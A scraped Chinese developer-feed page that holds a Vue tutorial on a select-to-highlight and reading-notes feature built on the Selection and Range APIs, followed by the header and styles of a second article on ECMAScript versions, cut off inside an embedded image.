.task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在在线教育、文档阅读或博客系统中，<strong>划词标注（Highlight &amp; Note）</strong> 是一个非常实用的功能。它允许用户像在纸质书上一样，用鼠标选中一段文字，进行高亮标记或添加读书笔记。</p>
<p>本文将拆解如何在 Vue 项目中实现这一功能，涵盖从底层的 <code>Selection API</code> 调用到 DOM 操作，再到数据状态管理的完整流程。</p>
<hr/>
<h2 data-id="heading-0">核心原理</h2>
<p>实现划词标注的核心在于浏览器提供的 <strong>Selection API</strong> 和 <strong>Range API</strong>。</p>
<ol>
<li><strong>Selection</strong>: 代表用户当前选中的文本范围（可能跨越多个节点）。</li>
<li><strong>Range</strong>: 代表文档中一个连续的区域（Selection 通常包含一个 Range）。</li>
<li><strong>DOM 操作</strong>: 将选中的文本用一个特定样式的标签（如 <code>&lt;span&gt;</code>）包裹起来，从而实现高亮效果。</li>
</ol>
<hr/>
<h2 data-id="heading-1">Step 1: 监听选区 (Capture Selection)</h2>
<p>首先，我们需要在用户松开鼠标（<code>mouseup</code>）时捕获选区。</p>
<p><strong>HTML 结构</strong>：
在内容容器上绑定 <code>mouseup</code> 事件。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content-container"</span> @<span class="hljs-attr">mouseup</span>=<span class="hljs-string">"handleTextSelection"</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- 文章内容 --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一段可以被选中的文本...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p><strong>JavaScript 实现</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">handleTextSelection</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 延时保证选区状态已更新</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> selection = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getSelection</span>();

    <span class="hljs-comment">// 1. 基础校验：必须是 Range 类型且非空</span>
    <span class="hljs-keyword">if</span> (selection.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">trim</span>() === <span class="hljs-string">''</span> || selection.<span class="hljs-property">type</span> !== <span class="hljs-string">'Range'</span> || selection.<span class="hljs-property">isCollapsed</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">selectionMenuVisible</span> = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 隐藏菜单</span>
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 2. 获取核心 Range 对象</span>
    <span class="hljs-keyword">const</span> range = selection.<span class="hljs-title function_">getRangeAt</span>(<span class="hljs-number">0</span>);

    <span class="hljs-comment">// 3. (可选) 进阶校验：禁止跨特定区域选择</span>
    <span class="hljs-comment">// 比如：不能同时选中 A 选项和 B 选项</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isCrossBlockSelection</span>(range)) {
      selection.<span class="hljs-title function_">removeAllRanges</span>();
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 4. 执行高亮包裹逻辑（见下文）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createTempHighlight</span>(range, selection);
  }, <span class="hljs-number">0</span>);
}
</code></pre>
<hr/>
<h2 data-id="heading-2">Step 2: 包裹文本 (Wrap Text)</h2>
<p>获取到 <code>Range</code> 后，我们需要将选中的文本用一个临时标签（Temp Span）包裹起来。这个标签通常有两个作用：</p>
<ol>
<li><strong>视觉反馈</strong>：给用户一个“预选中”的状态（例如浅蓝色背景）。</li>
<li><strong>定位锚点</strong>：用于计算后续“操作菜单”的显示位置。</li>
</ol>
<p><strong>核心代码</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">createTempHighlight</span>(<span class="hljs-params">range, selection</span>) {
  <span class="hljs-comment">// 创建一个包裹标签</span>
  <span class="hljs-keyword">const</span> span = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'span'</span>);
  span.<span class="hljs-property">className</span> = <span class="hljs-string">'temp-selection-highlight'</span>; <span class="hljs-comment">// 自定义样式类</span>

  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 核心操作：提取内容 -&gt; 插入节点</span>
    <span class="hljs-comment">// range.extractContents() 会将选区内容从 DOM 树中移除并返回 DocumentFragment</span>
    span.<span class="hljs-title function_">appendChild</span>(range.<span class="hljs-title function_">extractContents</span>());
    <span class="hljs-comment">// 将包裹后的 span 插入回原处</span>
    range.<span class="hljs-title function_">insertNode</span>(span);

    <span class="hljs-comment">// ⚠️重要：重置选区</span>
    <span class="hljs-comment">// 因为 DOM 结构改变了，原有的 selection 会失效或错位</span>
    <span class="hljs-comment">// 我们需要重新选中这个 span 的内容，让用户感觉“高亮还在”</span>
    <span class="hljs-keyword">const</span> newRange = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createRange</span>();
    newRange.<span class="hljs-title function_">selectNodeContents</span>(span);
    selection.<span class="hljs-title function_">removeAllRanges</span>();
    selection.<span class="hljs-title function_">addRange</span>(newRange);

    <span class="hljs-comment">// 保存当前 Range 引用，供后续操作使用</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentRange</span> = newRange;

    <span class="hljs-comment">// 5. 显示操作菜单</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">showActionMenu</span>(span);

  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Wrapping failed:'</span>, e);
  }
}
</code></pre>
<hr/>
<h2 data-id="heading-3">Step 3: 菜单定位 (Positioning Menu)</h2>
<p>操作菜单（“高亮”、“笔记”）通常悬浮在选区上方。我们可以利用 <code>getBoundingClientRect()</code> 或 <code>getClientRects()</code> 来获取位置。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">showActionMenu</span>(<span class="hljs-params">spanElement</span>) {
  <span class="hljs-comment">// 获取元素的位置信息</span>
  <span class="hljs-comment">// getClientRects() 对于跨行文本更准确，取最后一行</span>
  <span class="hljs-keyword">const</span> rects = spanElement.<span class="hljs-title function_">getClientRects</span>();
  <span class="hljs-keyword">const</span> lastRect = rects.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> ? rects[rects.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>] : spanElement.<span class="hljs-title function_">getBoundingClientRect</span>();

  <span class="hljs-comment">// 计算菜单坐标（相对于视口）</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">selectionMenuPosition</span> = {
    <span class="hljs-attr">top</span>: (lastRect.<span class="hljs-property">bottom</span> + <span class="hljs-number">5</span>) + <span class="hljs-string">'px'</span>, <span class="hljs-comment">// 显示在下方 5px 处</span>
    <span class="hljs-attr">left</span>: (lastRect.<span class="hljs-property">right</span> + <span class="hljs-number">5</span>) + <span class="hljs-string">'px'</span>
  };

  <span class="hljs-variable language_">this</span>.<span class="hljs-property">selectionMenuVisible</span> = <span class="hljs-literal">true</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-4">Step 4: 确认与状态管理 (Confirm &amp; State)</h2>
<p>用户点击菜单中的“高亮”或“笔记”按钮后，我们需要将临时的 <code>span</code> 转换为持久化的状态。</p>
<ol>
<li><strong>修改样式</strong>：将 <code>temp-selection-highlight</code> 类替换为 <code>permanent-highlight</code>（黄色）或 <code>note-highlight</code>（蓝色）。</li>
<li><strong>生成 ID</strong>：给 span 添加一个唯一 ID（如 <code>data-id="167..."</code>）。</li>
<li><strong>保存数据</strong>：将笔记内容推入 Vue 的数据数组中。</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">applyHighlight</span>(<span class="hljs-params">type</span>) {
  <span class="hljs-keyword">const</span> span = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.temp-selection-highlight'</span>);
  <span class="hljs-keyword">if</span> (!span) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// 1. 生成唯一 ID</span>
  <span class="hljs-keyword">const</span> id = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>().<span class="hljs-title function_">toString</span>();

  <span class="hljs-comment">// 2. 更新 DOM 类名和属性</span>
  span.<span class="hljs-property">className</span> = type === <span class="hljs-string">'note'</span> ? <span class="hljs-string">'note-highlight'</span> : <span class="hljs-string">'highlight-text'</span>;
  span.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'data-id'</span>, id);

  <span class="hljs-comment">// 3. 存入数据层</span>
  <span class="hljs-keyword">const</span> newNote = {
    id,
    <span class="hljs-attr">text</span>: span.<span class="hljs-property">innerText</span>, <span class="hljs-comment">// 选中的原文</span>
    type, <span class="hljs-comment">// 'highlight' or 'note'</span>
    <span class="hljs-attr">color</span>: type === <span class="hljs-string">'note'</span> ? <span class="hljs-string">'#e6f7ff'</span> : <span class="hljs-string">'#ffeb3b'</span>,
    <span class="hljs-attr">createTime</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
  };

  <span class="hljs-variable language_">this</span>.<span class="hljs-property">notesList</span>.<span class="hljs-title function_">push</span>(newNote);

  <span class="hljs-comment">// 4. 持久化（保存到后端或 LocalStorage）</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">saveData</span>();

  <span class="hljs-comment">// 5.如果是笔记，打开侧边栏供用户输入</span>
  <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'note'</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">openNoteSidebar</span>(id);
  }

  <span class="hljs-comment">// 清除选中状态</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getSelection</span>().<span class="hljs-title function_">removeAllRanges</span>();
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">selectionMenuVisible</span> = <span class="hljs-literal">false</span>;
}
</code></pre>
<hr/>
<h2 data-id="heading-5">Step 5: 取消高亮 (Unwrap)</h2>
<p>如果用户想删除高亮，我们需要执行“反向操作”：将 <code>span</code> 去掉，保留里面的文字。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">removeHighlight</span>(<span class="hljs-params">id</span>) {
  <span class="hljs-keyword">const</span> span = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">`span[data-id="<span class="hljs-subst">${id}</span>"]`</span>);
  <span class="hljs-keyword">if</span> (span) {
    <span class="hljs-keyword">const</span> parent = span.<span class="hljs-property">parentNode</span>;
    <span class="hljs-comment">// 将 span 的子节点（文本）移动到父节点中 span 的前面</span>
    <span class="hljs-keyword">while</span> (span.<span class="hljs-property">firstChild</span>) {
      parent.<span class="hljs-title function_">insertBefore</span>(span.<span class="hljs-property">firstChild</span>, span);
    }
    <span class="hljs-comment">// 移除空 span</span>
    parent.<span class="hljs-title function_">removeChild</span>(span);
    <span class="hljs-comment">// 规范化节点，合并相邻的文本节点</span>
    parent.<span class="hljs-title function_">normalize</span>();
  }

  <span class="hljs-comment">// 同步删除数据</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">notesList</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">notesList</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> n.<span class="hljs-property">id</span> !== id);
}
</code></pre>
<h2 data-id="heading-6">进阶技巧：从数据还原 DOM</h2>
<p>最大的难点在于：<strong>页面刷新后，如何重新渲染这些高亮？</strong></p>
<p>如果你的内容是纯静态的，可以直接保存包含 <code>span</code> 标签的 HTML 字符串。但由于 Vue 的 <code>v-html</code> 或 React 的 <code>dangerouslySetInnerHTML</code> 会导致 DOM 重绘，简单的 HTML 替换可能会丢失事件绑定。</p>
<p>更稳健的做法是：</p>
<ol>
<li>保存 <strong>选区路径</strong>（如：第 X 个段落，第 Y 个字符开始，长度 Z）。</li>
<li>页面加载时，遍历数据，利用 <code>createRange()</code> 重新定位并包裹 DOM。</li>
</ol>
<p>由于这通常涉及到复杂的 DOM 遍历算法，生产环境中推荐结合成熟库（如 <code>Rangy</code> 或自行实现基于 XPath 的定位）来处理复杂场景。</p>
<hr/>
<h2 data-id="heading-7">总结</h2>
<p>实现一个划词笔记功能，本质上是对 DOM Range 的灵活运用。通过 <strong>监听(Listen) -&gt; 包裹(Wrap) -&gt; 存储(Store) -&gt; 还原(Restore)</strong> 这四个步骤，我们就能为用户提供流畅的沉浸式阅读体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 ES2015 到 ES2025：你还跟得上吗]]></title>    <link>https://juejin.cn/post/7605625595570552847</link>    <guid>https://juejin.cn/post/7605625595570552847</guid>    <pubDate>2026-02-13T02:52:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605625595570552847" data-draft-id="7531888107878006819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 ES2015 到 ES2025：你还跟得上吗"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-13T02:52:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="布列瑟农的星空"/> <meta itemprop="url" content="https://juejin.cn/user/976022056218471"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 ES2015 到 ES2025：你还跟得上吗
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976022056218471/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    布列瑟农的星空
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:52:06.000Z" title="Fri Feb 13 2026 02:52:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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